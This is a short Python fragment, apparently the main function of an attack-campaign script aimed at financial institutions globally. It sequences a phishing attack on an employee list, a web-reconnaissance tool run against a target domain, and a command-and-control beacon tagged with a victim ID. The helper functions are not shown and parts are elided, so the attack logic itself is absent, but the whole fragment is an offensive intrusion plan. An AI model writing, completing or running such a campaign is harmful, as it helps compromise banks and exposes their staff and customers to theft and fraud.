...
def main():
    """
    Main function to run the financial_institution_campaign campaign.
    """
    print(f"[*] Starting financial_institution_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("financial_institutions_globally_employees.txt")
    run_tool("apt_web_recon.js", "--target financial_institutions_globally.com")
    ...
    command_control.send_beacon(c2_server, "VICTIM-FINANCIAL_INSTITUTIONS_GLOBALLY-01")
